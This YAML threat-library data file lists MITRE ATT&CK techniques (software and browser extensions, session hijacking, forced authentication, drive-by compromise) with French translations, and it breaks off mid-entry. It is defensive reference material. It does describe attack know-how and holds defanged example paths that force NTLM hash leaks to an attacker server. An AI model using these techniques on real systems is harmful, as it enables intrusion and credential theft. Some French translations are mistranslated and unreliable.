  - urn: urn:intuitem:risk:threat:mitre-attack:t1176
    ref_id: T1176
    name: Software Extensions
    description: "Adversaries may abuse software extensions to establish persistent\
      \ access to victim systems. Software extensions are modular components that\
      \ enhance or customize the functionality of software applications, including\
      \ web browsers, Integrated Development Environments (IDEs), and other platforms.(Citation:\
      \ Chrome Extension C2 Malware)(Citation: Abramovsky VSCode Security) Extensions\
      \ are typically installed via official marketplaces, app stores, or manually\
      \ loaded by users, and they often inherit the permissions and access levels\
      \ of the host application. \n\n  \nMalicious extensions can be introduced through\
      \ various methods, including social engineering, compromised marketplaces, or\
      \ direct installation by users or by adversaries who have already gained access\
      \ to a system. Malicious extensions can be named similarly or identically to\
      \ benign extensions in marketplaces. Security mechanisms in extension marketplaces\
      \ may be insufficient to detect malicious components, allowing adversaries to\
      \ bypass automated scanners or exploit trust established during the installation\
      \ process. Adversaries may also abuse benign extensions to achieve their objectives,\
      \ such as using legitimate functionality to tunnel data or bypass security controls.\
      \ \n\nThe modular nature of extensions and their integration with host applications\
      \ make them an attractive target for adversaries seeking to exploit trusted\
      \ software ecosystems. Detection can be challenging due to the inherent trust\
      \ placed in extensions during installation and their ability to blend into normal\
      \ application workflows.\nhttps://attack.mitre.org/techniques/T1176"
    translations:
      fr:
        name: Extensions logicielles
        description: "Les adversaires peuvent abuser des extensions logicielles pour\
          \ \xE9tablir un acc\xE8s persistant aux syst\xE8mes des victimes. Les extensions\
          \ logicielles sont des composants modulaires qui am\xE9liorent ou personnalisent\
          \ la fonctionnalit\xE9 des applications logicielles, y compris les navigateurs\
          \ web, les environnements de d\xE9veloppement int\xE9gr\xE9s (IDE) et d\u2019\
          autres plateformes. (Citation : Malware C2 de l\u2019extension Chrome)(Citation\
          \ : Abramovsky VSCode Security) Les extensions sont g\xE9n\xE9ralement install\xE9\
          es via des places de march\xE9 officielles, des boutiques d\u2019applications,\
          \ ou charg\xE9es manuellement par les utilisateurs, et elles h\xE9ritent\
          \ souvent des permissions et des niveaux d\u2019acc\xE8s de l\u2019application\
          \ h\xF4te. \n\nLes extensions malveillantes peuvent \xEAtre introduites\
          \ par divers moyens, notamment l\u2019ing\xE9nierie sociale, des march\xE9\
          s compromis ou l\u2019installation directe par des utilisateurs ou des adversaires\
          \ ayant d\xE9j\xE0 acc\xE8s \xE0 un syst\xE8me. Les extensions malveillantes\
          \ peuvent \xEAtre nomm\xE9es de mani\xE8re similaire ou identique aux extensions\
          \ b\xE9nignes sur les march\xE9s. Les m\xE9canismes de s\xE9curit\xE9 dans\
          \ les march\xE9s d\u2019extensions peuvent \xEAtre insuffisants pour d\xE9\
          tecter des composants malveillants, permettant aux adversaires de contourner\
          \ les scanners automatis\xE9s ou d\u2019exploiter la confiance \xE9tablie\
          \ lors du processus d\u2019installation. Les adversaires peuvent \xE9galement\
          \ abuser d\u2019extensions b\xE9nignes pour atteindre leurs objectifs, comme\
          \ utiliser des fonctionnalit\xE9s l\xE9gitimes pour tunneler des donn\xE9\
          es ou contourner les contr\xF4les de s\xE9curit\xE9. \n\nLa nature modulaire\
          \ des extensions et leur int\xE9gration avec les applications h\xF4tes en\
          \ font une cible attrayante pour les adversaires cherchant \xE0 exploiter\
          \ des \xE9cosyst\xE8mes logiciels de confiance. La d\xE9tection peut \xEA\
          tre difficile en raison de la confiance inh\xE9rente accord\xE9e aux extensions\
          \ lors de l\u2019installation et de leur capacit\xE9 \xE0 s\u2019int\xE9\
          grer aux flux de travail normaux des applications.\nhttps://attack.mitre.org/techniques/T1176"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1176.001
    ref_id: T1176.001
    name: Browser Extensions
    description: "Adversaries may abuse internet browser extensions to establish persistent\
      \ access to victim systems. Browser extensions or plugins are small programs\
      \ that can add functionality to and customize aspects of internet browsers.\
      \ They can be installed directly via a local file or custom URL or through a\
      \ browser's app store - an official online platform where users can browse,\
      \ install, and manage extensions for a specific web browser. Extensions generally\
      \ inherit the web browser's permissions previously granted.(Citation: Wikipedia\
      \ Browser Extension)(Citation: Chrome Extensions Definition) \n \nMalicious\
      \ extensions can be installed into a browser through malicious app store downloads\
      \ masquerading as legitimate extensions, through social engineering, or by an\
      \ adversary that has already compromised a system. Security can be limited on\
      \ browser app stores, so it may not be difficult for malicious extensions to\
      \ defeat automated scanners.(Citation: Malicious Chrome Extension Numbers) Depending\
      \ on the browser, adversaries may also manipulate an extension's update url\
      \ to install updates from an adversary-controlled server or manipulate the mobile\
      \ configuration file to silently install additional extensions. \n\nAdversaries\
      \ may abuse how chromium-based browsers load extensions by modifying or replacing\
      \ the Preferences and/or Secure Preferences files to silently install malicious\
      \ extensions. When the browser is not running, adversaries can alter these files,\
      \ ensuring the extension is loaded, granted desired permissions, and will persist\
      \ in browser sessions. This method does not require user consent and extensions\
      \ are silently loaded in the background from disk or from the browser's trusted\
      \ store.(Citation: Pulsedive)\n  \nPrevious to macOS 11, adversaries could silently\
      \ install browser extensions via the command line using the <code>profiles</code>\
      \ tool to install malicious <code>.mobileconfig</code> files. In macOS 11+,\
      \ the use of the <code>profiles</code> tool can no longer install configuration\
      \ profiles; however, <code>.mobileconfig</code> files can be planted and installed\
      \ with user interaction.(Citation: xorrior chrome extensions macOS) \n \nOnce\
      \ the extension is installed, it can browse to websites in the background, steal\
      \ all information that a user enters into a browser (including credentials),\
      \ and be used as an installer for a RAT for persistence.(Citation: Chrome Extension\
      \ Crypto Miner)(Citation: ICEBRG Chrome Extensions)(Citation: Banker Google\
      \ Chrome Extension Steals Creds)(Citation: Catch All Chrome Extension) \n\n\
      There have also been instances of botnets using a persistent backdoor through\
      \ malicious Chrome extensions for [Command and Control](https://attack.mitre.org/tactics/TA0011).(Citation:\
      \ Stantinko Botnet)(Citation: Chrome Extension C2 Malware) Adversaries may also\
      \ use browser extensions to modify browser permissions and components, privacy\
      \ settings, and other security controls for [Stealth](https://attack.mitre.org/tactics/TA0005).(Citation:\
      \ Browers FriarFox)(Citation: Browser Adrozek)\nhttps://attack.mitre.org/techniques/T1176/001"
    translations:
      fr:
        name: Extensions de navigateur
        description: "Les cybercriminels peuvent exploiter les extensions de navigateur\
          \ Internet pour obtenir un acc\xE8s persistant aux syst\xE8mes des victimes.\
          \ Les extensions ou plugins de navigateur sont de petits programmes qui\
          \ permettent d\u2019ajouter des fonctionnalit\xE9s et de personnaliser certains\
          \ aspects des navigateurs Internet. Elles peuvent \xEAtre install\xE9es\
          \ directement \xE0 partir d\u2019un fichier local ou d\u2019une URL personnalis\xE9\
          e, ou via la boutique d\u2019applications du navigateur \u2014 une plateforme\
          \ en ligne officielle o\xF9 les utilisateurs peuvent parcourir, installer\
          \ et g\xE9rer les extensions destin\xE9es \xE0 un navigateur Web sp\xE9\
          cifique. Les extensions h\xE9ritent g\xE9n\xE9ralement des autorisations\
          \ pr\xE9c\xE9demment accord\xE9es au navigateur web. (R\xE9f\xE9rence :\
          \ Wikip\xE9dia, \xAB Extension de navigateur \xBB) (R\xE9f\xE9rence : D\xE9\
          finition des extensions Chrome) \n \nDes extensions malveillantes peuvent\
          \ \xEAtre install\xE9es dans un navigateur via des t\xE9l\xE9chargements\
          \ malveillants depuis une boutique d\u2019applications, se faisant passer\
          \ pour des extensions l\xE9gitimes, par le biais d\u2019attaques d\u2019\
          ing\xE9nierie sociale, ou par un attaquant ayant d\xE9j\xE0 compromis un\
          \ syst\xE8me. La s\xE9curit\xE9 des boutiques d\u2019applications des navigateurs\
          \ pouvant \xEAtre limit\xE9e, il n\u2019est pas forc\xE9ment difficile pour\
          \ des extensions malveillantes de contourner les scanners automatis\xE9\
          s. (R\xE9f\xE9rence : Nombre d\u2019extensions Chrome malveillantes) Selon\
          \ le navigateur, les attaquants peuvent \xE9galement manipuler l\u2019URL\
          \ de mise \xE0 jour d\u2019une extension pour installer des mises \xE0 jour\
          \ \xE0 partir d\u2019un serveur qu\u2019ils contr\xF4lent, ou manipuler\
          \ le fichier de configuration mobile pour installer silencieusement des\
          \ extensions suppl\xE9mentaires. \n\nLes attaquants peuvent exploiter la\
          \ mani\xE8re dont les navigateurs bas\xE9s sur Chromium chargent les extensions\
          \ en modifiant ou en rempla\xE7ant les fichiers \xAB Preferences \xBB et/ou\
          \ \xAB Secure Preferences \xBB afin d\u2019installer \xE0 l\u2019insu de\
          \ l\u2019utilisateur des extensions malveillantes. Lorsque le navigateur\
          \ n\u2019est pas en cours d\u2019ex\xE9cution, les attaquants peuvent alt\xE9\
          rer ces fichiers, s\u2019assurant ainsi que l\u2019extension soit charg\xE9\
          e, qu\u2019elle b\xE9n\xE9ficie des autorisations souhait\xE9es et qu\u2019\
          elle persiste au fil des sessions du navigateur. Cette m\xE9thode ne n\xE9\
          cessite pas le consentement de l\u2019utilisateur et les extensions sont\
          \ charg\xE9es en arri\xE8re-plan, \xE0 l\u2019insu de l\u2019utilisateur,\
          \ \xE0 partir du disque ou du magasin de confiance du navigateur. (Source\
          \ : Pulsedive)\n  \nAvant macOS 11, les attaquants pouvaient installer \xE0\
          \ l\u2019insu de l\u2019utilisateur des extensions de navigateur via la\
          \ ligne de commande en utilisant l\u2019outil <code>profiles</code> pour\
          \ installer des fichiers <code>.mobileconfig</code> malveillants. Sous macOS\
          \ 11 et versions ult\xE9rieures, l\u2019utilisation de l\u2019outil <code>profiles</code>\
          \ ne permet plus d\u2019installer des profils de configuration ; toutefois,\
          \ des fichiers <code>.mobileconfig</code> peuvent \xEAtre implant\xE9s et\
          \ install\xE9s avec l\u2019intervention de l\u2019utilisateur. (Source :\
          \ xorrior chrome extensions macOS) \n \nUne fois l\u2019extension install\xE9\
          e, elle peut naviguer sur des sites web en arri\xE8re-plan, voler toutes\
          \ les informations saisies par l\u2019utilisateur dans le navigateur (y\
          \ compris ses identifiants) et servir de programme d\u2019installation pour\
          \ un RAT afin d\u2019assurer la persistance du logiciel malveillant. (R\xE9\
          f\xE9rence : Extension Chrome Crypto Miner) (R\xE9f\xE9rence : Extensions\
          \ Chrome ICEBRG) (R\xE9f\xE9rence : L\u2019extension Google Chrome \xAB\
          \ Banker \xBB vole des identifiants) (R\xE9f\xE9rence : Extension Chrome\
          \ \xAB Catch All \xBB) \n\nOn a \xE9galement observ\xE9 des cas o\xF9 des\
          \ botnets utilisaient une porte d\xE9rob\xE9e persistante via des extensions\
          \ Chrome malveillantes \xE0 des fins de [commande et de contr\xF4le](https://attack.mitre.org/tactics/TA0011).\
          \ (R\xE9f\xE9rence : botnet Stantinko) (R\xE9f\xE9rence : malware C2 via\
          \ une extension Chrome) Les attaquants peuvent \xE9galement utiliser des\
          \ extensions de navigateur pour modifier les autorisations et les composants\
          \ du navigateur, les param\xE8tres de confidentialit\xE9 et d\u2019autres\
          \ contr\xF4les de s\xE9curit\xE9 \xE0 des fins de [discr\xE9tion](https://attack.mitre.org/tactics/TA0005).\
          \ (R\xE9f\xE9rence : navigateur FriarFox) (R\xE9f\xE9rence : navigateur\
          \ Adrozek)\nhttps://attack.mitre.org/techniques/T1176/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1176.002
    ref_id: T1176.002
    name: IDE Extensions
    description: "Adversaries may abuse an integrated development environment (IDE)\
      \ extension to establish persistent access to victim systems.(Citation: Mnemonic\
      \ misuse visual studio) IDEs such as Visual Studio Code, IntelliJ IDEA, and\
      \ Eclipse support extensions - software components that add features like code\
      \ linting, auto-completion, task automation, or integration with tools like\
      \ Git and Docker. A malicious extension can be installed through an extension\
      \ marketplace (i.e., [Compromise Software Dependencies and Development Tools](https://attack.mitre.org/techniques/T1195/001))\
      \ or side-loaded directly into the IDE.(Citation: Abramovsky VSCode Security)(Citation:\
      \ Lakshmanan Visual Studio Marketplace)   \n\nIn addition to installing malicious\
      \ extensions, adversaries may also leverage benign ones. For example, adversaries\
      \ may establish persistent SSH tunnels via the use of the VSCode Remote SSH\
      \ extension (i.e., [IDE Tunneling](https://attack.mitre.org/techniques/T1219/001)).\
      \  \n\nTrust is typically established through the installation process; once\
      \ installed, the malicious extension is run every time that the IDE is launched.\
      \ The extension can then be used to execute arbitrary code, establish a backdoor,\
      \ mine cryptocurrency, or exfiltrate data.(Citation: ExtensionTotal VSCode Extensions\
      \  2025)\nhttps://attack.mitre.org/techniques/T1176/002"
    translations:
      fr:
        name: IDE Extensions
        description: "Les adversaires peuvent abuser d\u2019une extension de l\u2019\
          environnement de d\xE9veloppement int\xE9gr\xE9 (IDE) pour \xE9tablir un\
          \ acc\xE8s persistant aux syst\xE8mes victimes. (Citation : Usage mn\xE9\
          motechnique abusif de Visual Studio) Les IDE tels que Visual Studio Code,\
          \ IntelliJ IDEA et Eclipse prennent en charge les extensions \u2013 des\
          \ composants logiciels qui ajoutent des fonctionnalit\xE9s comme le codelinting,\
          \ l\u2019auto-compl\xE9tion, l\u2019automatisation des t\xE2ches ou l\u2019\
          int\xE9gration avec des outils comme Git et Docker. Une extension malveillante\
          \ peut \xEAtre install\xE9e via un march\xE9 d\u2019extensions (c\u2019\
          est-\xE0-dire [Compromettre les d\xE9pendances logicielles et les outils\
          \ de d\xE9veloppement](https://attack.mitre.org/techniques/T1195/001)) ou\
          \ \xEAtre install\xE9e directement dans l\u2019IDE. (Citation : Abramovsky\
          \ VSCode Security)(Citation : Lakshmanan Visual Studio Marketplace)   \n\
          \nEn plus d\u2019installer des extensions malveillantes, les adversaires\
          \ peuvent \xE9galement utiliser des extensions inoffensives. Par exemple,\
          \ les adversaires peuvent \xE9tablir des tunnels SSH persistants via l\u2019\
          extension SSH distante VSCode (c\u2019est-\xE0-dire [IDE Tunneling](https://attack.mitre.org/techniques/T1219/001)).\
          \  \n\nLa confiance est g\xE9n\xE9ralement \xE9tablie par le processus d\u2019\
          installation ; une fois install\xE9e, l\u2019extension malveillante est\
          \ ex\xE9cut\xE9e \xE0 chaque lancement de l\u2019IDE. L\u2019extension peut\
          \ ensuite \xEAtre utilis\xE9e pour ex\xE9cuter du code arbitraire, \xE9\
          tablir une porte d\xE9rob\xE9e, miner des cryptomonnaies ou exfiltrer des\
          \ donn\xE9es. (Citation : ExtensionTotal VSCode Extensions 2025)\nhttps://attack.mitre.org/techniques/T1176/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1185
    ref_id: T1185
    name: Browser Session Hijacking
    description: 'Adversaries may take advantage of security vulnerabilities and inherent
      functionality in browser software to change content, modify user-behaviors,
      and intercept information as part of various browser session hijacking techniques.(Citation:
      Wikipedia Man in the Browser)


      A specific example is when an adversary injects software into a browser that
      allows them to inherit cookies, HTTP sessions, and SSL client certificates of
      a user then use the browser as a way to pivot into an authenticated intranet.(Citation:
      Cobalt Strike Browser Pivot)(Citation: ICEBRG Chrome Extensions) Executing browser-based
      behaviors such as pivoting may require specific process permissions, such as
      <code>SeDebugPrivilege</code> and/or high-integrity/administrator rights.


      Another example involves pivoting browser traffic from the adversary''s browser
      through the user''s browser by setting up a proxy which will redirect web traffic.
      This does not alter the user''s traffic in any way, and the proxy connection
      can be severed as soon as the browser is closed. The adversary assumes the security
      context of whichever browser process the proxy is injected into. Browsers typically
      create a new process for each tab that is opened and permissions and certificates
      are separated accordingly. With these permissions, an adversary could potentially
      browse to any resource on an intranet, such as [Sharepoint](https://attack.mitre.org/techniques/T1213/002)
      or webmail, that is accessible through the browser and which the browser has
      sufficient permissions. Browser pivoting may also bypass security provided by
      2-factor authentication.(Citation: cobaltstrike manual)

      https://attack.mitre.org/techniques/T1185'
    translations:
      fr:
        name: "D\xE9tournement de session de navigateur"
        description: "Les adversaires peuvent tirer parti des vuln\xE9rabilit\xE9\
          s de s\xE9curit\xE9 et des fonctionnalit\xE9s inh\xE9rentes aux logiciels\
          \ de navigateur pour modifier le contenu, modifier les comportements des\
          \ utilisateurs et intercepter des informations dans le cadre de diverses\
          \ techniques de d\xE9tournement de session du navigateur. (Citation : Wikipedia\
          \ Man dans le navigateur)\n\nUn exemple pr\xE9cis est lorsqu\u2019un adversaire\
          \ injecte un logiciel dans un navigateur qui lui permet d\u2019h\xE9riter\
          \ des cookies, des sessions HTTP et des certificats clients SSL d\u2019\
          un utilisateur, puis utilise le navigateur comme moyen de pivoter vers un\
          \ intranet authentifi\xE9. (Citation : Pivot du navigateur Cobalt Strike)(Citation\
          \ : Extensions Chrome ICEBRG) L\u2019ex\xE9cution de comportements bas\xE9\
          s sur navigateur, comme le pivot, peut n\xE9cessiter des autorisations sp\xE9\
          cifiques de processus, telles que <code>SeDebugPrivilege</code> et/ou des\
          \ droits d\u2019int\xE9grit\xE9/administrateur \xE9lev\xE9.\n\nUn autre\
          \ exemple consiste \xE0 pivoter le trafic du navigateur de l\u2019adversaire\
          \ vers celui de l\u2019utilisateur en configurant un proxy qui redirige\
          \ le trafic web. Cela ne modifie en rien le trafic de l\u2019utilisateur,\
          \ et la connexion proxy peut \xEAtre coup\xE9e d\xE8s que le navigateur\
          \ est ferm\xE9. L\u2019adversaire suppose le contexte de s\xE9curit\xE9\
          \ du processus navigateur dans lequel le proxy est inject\xE9. Les navigateurs\
          \ cr\xE9ent g\xE9n\xE9ralement un nouveau processus pour chaque onglet ouvert\
          \ et les permissions ainsi que les certificats sont s\xE9par\xE9s en cons\xE9\
          quence. Avec ces permissions, un adversaire pourrait potentiellement naviguer\
          \ vers n\u2019importe quelle ressource sur un intranet, comme [Sharepoint](https://attack.mitre.org/techniques/T1213/002)\
          \ ou webmail, accessible via le navigateur et dont le navigateur dispose\
          \ de permissions suffisantes. Le pivoting du navigateur peut \xE9galement\
          \ contourner la s\xE9curit\xE9 offerte par l\u2019authentification \xE0\
          \ deux facteurs. (Citation : manuel de cobaltstrike)\nhttps://attack.mitre.org/techniques/T1185"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1187
    ref_id: T1187
    name: Forced Authentication
    description: 'Adversaries may gather credential material by invoking or forcing
      a user to automatically provide authentication information through a mechanism
      in which they can intercept.


      The Server Message Block (SMB) protocol is commonly used in Windows networks
      for authentication and communication between systems for access to resources
      and file sharing. When a Windows system attempts to connect to an SMB resource
      it will automatically attempt to authenticate and send credential information
      for the current user to the remote system.(Citation: Wikipedia Server Message
      Block) This behavior is typical in enterprise environments so that users do
      not need to enter credentials to access network resources.


      Web Distributed Authoring and Versioning (WebDAV) is also typically used by
      Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is
      an extension of HTTP and will typically operate over TCP ports 80 and 443.(Citation:
      Didier Stevens WebDAV Traffic)(Citation: Microsoft Managing WebDAV Security)


      Adversaries may take advantage of this behavior to gain access to user account
      hashes through forced SMB/WebDAV authentication. An adversary can send an attachment
      to a user through spearphishing that contains a resource link to an external
      server controlled by the adversary  (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)),
      or place a specially crafted file on navigation path for privileged accounts
      (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed
      by victim(s). When the user''s system accesses the untrusted resource, it will
      attempt authentication and send information, including the user''s hashed credentials,
      over SMB to the adversary-controlled server.(Citation: GitHub Hashjacking) With
      access to the credential hash, an adversary can perform off-line [Brute Force](https://attack.mitre.org/techniques/T1110)
      cracking to gain access to plaintext credentials.(Citation: Cylance Redirect
      to SMB)


      There are several different ways this can occur.(Citation: Osanda Stealing NetNTLM
      Hashes) Some specifics from in-the-wild use include:


      * A spearphishing attachment containing a document with a resource that is automatically
      loaded when the document is opened (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)).
      The document can include, for example, a request similar to <code>file[:]//[remote
      address]/Normal.dotm</code> to trigger the SMB request.(Citation: US-CERT APT
      Energy Oct 2017)

      * A modified .LNK or .SCF file with the icon filename pointing to an external
      reference such as <code>\\[remote address]\pic.png</code> that will force the
      system to load the resource when the icon is rendered to repeatedly gather credentials.(Citation:
      US-CERT APT Energy Oct 2017)


      Alternatively, by leveraging the <code>EfsRpcOpenFileRaw</code> function, an
      adversary can send SMB requests to a remote system''s MS-EFSRPC interface and
      force the victim computer to initiate an authentication procedure and share
      its authentication details. The Encrypting File System Remote Protocol (EFSRPC)
      is a protocol used in Windows networks for maintenance and management operations
      on encrypted data that is stored remotely to be accessed over a network. Utilization
      of <code>EfsRpcOpenFileRaw</code> function in EFSRPC is used to open an encrypted
      object on the server for backup or restore. Adversaries can collect this data
      and abuse it as part of a NTLM relay attack to gain access to remote systems
      on the same internal network.(Citation: Rapid7)(Citation: GitHub)

      https://attack.mitre.org/techniques/T1187'
    translations:
      fr:
        name: "Authentification forc\xE9e"
        description: "Les attaquants peuvent collecter des identifiants en incitant\
          \ ou en for\xE7ant un utilisateur \xE0 fournir automatiquement des informations\
          \ d'authentification via un m\xE9canisme qu'ils sont en mesure d'intercepter.\n\
          \nLe protocole SMB (Server Message Block) est couramment utilis\xE9 dans\
          \ les r\xE9seaux Windows pour l\u2019authentification et la communication\
          \ entre les syst\xE8mes, afin de permettre l\u2019acc\xE8s aux ressources\
          \ et le partage de fichiers. Lorsqu\u2019un syst\xE8me Windows tente de\
          \ se connecter \xE0 une ressource SMB, il essaie automatiquement de s\u2019\
          authentifier et d\u2019envoyer les informations d\u2019identification de\
          \ l\u2019utilisateur actuel au syst\xE8me distant. (Source : Wikip\xE9dia,\
          \ Server Message Block) Ce comportement est courant dans les environnements\
          \ d\u2019entreprise, afin que les utilisateurs n\u2019aient pas \xE0 saisir\
          \ leurs identifiants pour acc\xE9der aux ressources r\xE9seau.\n\nLe protocole\
          \ Web Distributed Authoring and Versioning (WebDAV) est \xE9galement couramment\
          \ utilis\xE9 par les syst\xE8mes Windows comme protocole de secours lorsque\
          \ le protocole SMB est bloqu\xE9 ou tombe en panne. WebDAV est une extension\
          \ du protocole HTTP et fonctionne g\xE9n\xE9ralement sur les ports TCP 80\
          \ et 443. (R\xE9f\xE9rence : Didier Stevens, \xAB WebDAV Traffic \xBB) (R\xE9\
          f\xE9rence : Microsoft, \xAB Managing WebDAV Security \xBB)\n\nLes attaquants\
          \ peuvent exploiter ce comportement pour acc\xE9der aux hachages des comptes\
          \ utilisateurs via une authentification SMB/WebDAV forc\xE9e. Un attaquant\
          \ peut envoyer \xE0 un utilisateur, dans le cadre d\u2019une attaque de\
          \ spearphishing, une pi\xE8ce jointe contenant un lien vers une ressource\
          \ h\xE9berg\xE9e sur un serveur externe qu\u2019il contr\xF4le (par exemple\
          \ [Injection de mod\xE8le](https://attack.mitre.org/techniques/T1221)),\
          \ ou placer un fichier sp\xE9cialement con\xE7u sur le chemin de navigation\
          \ des comptes privil\xE9gi\xE9s (par exemple, un fichier .SCF plac\xE9 sur\
          \ le bureau) ou sur un partage accessible au public auquel la ou les victimes\
          \ auront acc\xE8s. Lorsque le syst\xE8me de l\u2019utilisateur acc\xE8de\
          \ \xE0 cette ressource non fiable, il tente de s\u2019authentifier et envoie\
          \ des informations, notamment les identifiants hach\xE9s de l\u2019utilisateur,\
          \ via SMB vers le serveur contr\xF4l\xE9 par l\u2019attaquant. (R\xE9f\xE9\
          rence : GitHub Hashjacking) Une fois en possession du hachage des identifiants,\
          \ un attaquant peut effectuer une attaque par force brute hors ligne [Brute\
          \ Force](https://attack.mitre.org/techniques/T1110) afin d\u2019acc\xE9\
          der aux identifiants en clair. (R\xE9f\xE9rence : Cylance Redirect to SMB)\n\
          \nCe sc\xE9nario peut se produire de plusieurs mani\xE8res diff\xE9rentes.\
          \ (R\xE9f\xE9rence : Osanda Stealing NetNTLM Hashes) Voici quelques exemples\
          \ concrets d\u2019utilisation observ\xE9s en milieu r\xE9el :\n\n* Une pi\xE8\
          ce jointe de spearphishing contenant un document avec une ressource qui\
          \ se charge automatiquement \xE0 l'ouverture du document (c'est-\xE0-dire\
          \ [injection de mod\xE8le](https://attack.mitre.org/techniques/T1221)).\
          \ Le document peut inclure, par exemple, une requ\xEAte similaire \xE0 <code>file[:]//[adresse\
          \ distante]/Normal.dotm</code> pour d\xE9clencher la requ\xEAte SMB. (R\xE9\
          f\xE9rence : US-CERT APT Energy, octobre 2017)\n* Un fichier .LNK ou .SCF\
          \ modifi\xE9 dont le nom de fichier de l\u2019ic\xF4ne pointe vers une r\xE9\
          f\xE9rence externe telle que <code>\\\\[adresse distante]\\pic.png</code>,\
          \ ce qui forcera le syst\xE8me \xE0 charger la ressource lors du rendu de\
          \ l\u2019ic\xF4ne afin de collecter de mani\xE8re r\xE9p\xE9t\xE9e des identifiants.\
          \ (Source : US-CERT APT Energy, octobre 2017)\n\nPar ailleurs, en exploitant\
          \ la fonction <code>EfsRpcOpenFileRaw</code>, un attaquant peut envoyer\
          \ des requ\xEAtes SMB \xE0 l\u2019interface MS-EFSRPC d\u2019un syst\xE8\
          me distant et forcer l\u2019ordinateur de la victime \xE0 lancer une proc\xE9\
          dure d\u2019authentification et \xE0 partager ses informations d\u2019authentification.\
          \ Le protocole EFSRPC (Encrypting File System Remote Protocol) est un protocole\
          \ utilis\xE9 dans les r\xE9seaux Windows pour les op\xE9rations de maintenance\
          \ et de gestion des donn\xE9es chiffr\xE9es stock\xE9es \xE0 distance et\
          \ accessibles via un r\xE9seau. L\u2019utilisation de la fonction <code>EfsRpcOpenFileRaw</code>\
          \ dans EFSRPC sert \xE0 ouvrir un objet chiffr\xE9 sur le serveur \xE0 des\
          \ fins de sauvegarde ou de restauration. Les attaquants peuvent collecter\
          \ ces donn\xE9es et en abuser dans le cadre d\u2019une attaque par relais\
          \ NTLM afin d\u2019acc\xE9der \xE0 des syst\xE8mes distants sur le m\xEA\
          me r\xE9seau interne. (Source : Rapid7) (Source : GitHub)\nhttps://attack.mitre.org/techniques/T1187"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1189
    ref_id: T1189
    name: Drive-by Compromise
    description: 'Adversaries may gain access to a system through a user visiting
      a website over the normal course of browsing. Multiple ways of delivering exploit
      code to a browser exist (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004)),
      including:


      * A legitimate website is compromised, allowing adversaries to inject malicious
      code

      * Script files served to a legitimate website from a publicly writeable cloud
      storage bucket are modified by an adversary

      * Malicious ads are paid for and served through legitimate ad providers (i.e.,
      [Malvertising](https://attack.mitre.org/techniques/T1583/008))

      * Built-in web application interfaces that allow user-controllable content are
      leveraged for the insertion of malicious scripts or iFrames (e.g., cross-site
      scripting)


      Browser push notifications may also be abused by adversaries and leveraged for
      malicious code injection via [User Execution](https://attack.mitre.org/techniques/T1204).
      By clicking "allow" on browser push notifications, users may be granting a website
      permission to run JavaScript code on their browser.(Citation: Push notifications
      - viruspositive)(Citation: push notification -mcafee)(Citation: push notifications
      - malwarebytes)


      Often the website used by an adversary is one visited by a specific community,
      such as government, a particular industry, or a particular region, where the
      goal is to compromise a specific user or set of users based on a shared interest.
      This kind of targeted campaign is often referred to a strategic web compromise
      or watering hole attack. There are several known examples of this occurring.(Citation:
      Shadowserver Strategic Web Compromise)


      Typical drive-by compromise process:


      1. A user visits a website that is used to host the adversary controlled content.

      2. Scripts automatically execute, typically searching versions of the browser
      and plugins for a potentially vulnerable version. The user may be required to
      assist in this process by enabling scripting, notifications, or active website
      components and ignoring warning dialog boxes.

      3. Upon finding a vulnerable version, exploit code is delivered to the browser.

      4. If exploitation is successful, the adversary will gain code execution on
      the user''s system unless other protections are in place. In some cases, a second
      visit to the website after the initial scan is required before exploit code
      is delivered.


      Unlike [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190),
      the focus of this technique is to exploit software on a client endpoint upon
      visiting a website. This will commonly give an adversary access to systems on
      the internal network instead of external systems that may be in a DMZ.

      https://attack.mitre.org/techniques/T1189'
    translations:
      fr:
        name: Compromis en voiture
        description: "Les adversaires peuvent acc\xE9der \xE0 un syst\xE8me gr\xE2\
          ce \xE0 un utilisateur visitant un site web au cours du d\xE9roulement normal\
          \ de sa navigation. Il existe plusieurs fa\xE7ons de livrer du code d\u2019\
          exploitation \xE0 un navigateur (par exemple, [Cible en voiture](https://attack.mitre.org/techniques/T1608/004)),\
          \ notamment :\n\n* Un site web l\xE9gitime est compromis, permettant aux\
          \ adversaires d\u2019injecter du code malveillant\n* Les fichiers script\
          \ servis \xE0 un site web l\xE9gitime depuis un bac de stockage cloud publiquement\
          \ \xE9crivable sont modifi\xE9s par un adversaire\n* Les publicit\xE9s malveillantes\
          \ sont pay\xE9es et diffus\xE9es via des fournisseurs publicitaires l\xE9\
          gitimes (c\u2019est-\xE0-dire [Malvertising](https://attack.mitre.org/techniques/T1583/008))\n\
          * Des interfaces web int\xE9gr\xE9es permettant un contenu contr\xF4lable\
          \ par l\u2019utilisateur sont utilis\xE9es pour l\u2019insertion de scripts\
          \ malveillants ou d\u2019iFrames (par exemple, scripts inter-sites)\n\n\
          Les notifications push du navigateur peuvent \xE9galement \xEAtre abus\xE9\
          es par les adversaires et utilis\xE9es pour l\u2019injection de code malveillant\
          \ via [User Execution](https://attack.mitre.org/techniques/T1204). En cliquant\
          \ sur \xAB autoriser \xBB dans les notifications push du navigateur, les\
          \ utilisateurs peuvent accorder \xE0 un site web la permission d\u2019ex\xE9\
          cuter du code JavaScript sur leur navigateur. (Citation : Notifications\
          \ push - viruspositif)(Citation : notification push -mcafee)(Citation :\
          \ notifications push - malwarebytes)\n\nSouvent, le site web utilis\xE9\
          \ par un adversaire est un site visit\xE9 par une communaut\xE9 sp\xE9cifique,\
          \ telle que le gouvernement, une industrie particuli\xE8re ou une r\xE9\
          gion particuli\xE8re, dont l\u2019objectif est de compromettre un utilisateur\
          \ ou un ensemble d\u2019utilisateurs en raison d\u2019un int\xE9r\xEAt commun.\
          \ Ce type de campagne cibl\xE9e est souvent qualifi\xE9e de compromission\
          \ strat\xE9gique du web ou d\u2019attaque de points d\u2019eau. Il existe\
          \ plusieurs exemples connus de ce type de situation. (Citation : Compromission\
          \ strat\xE9gique du Web Shadowserver)\n\nProcessus typique de compromis\
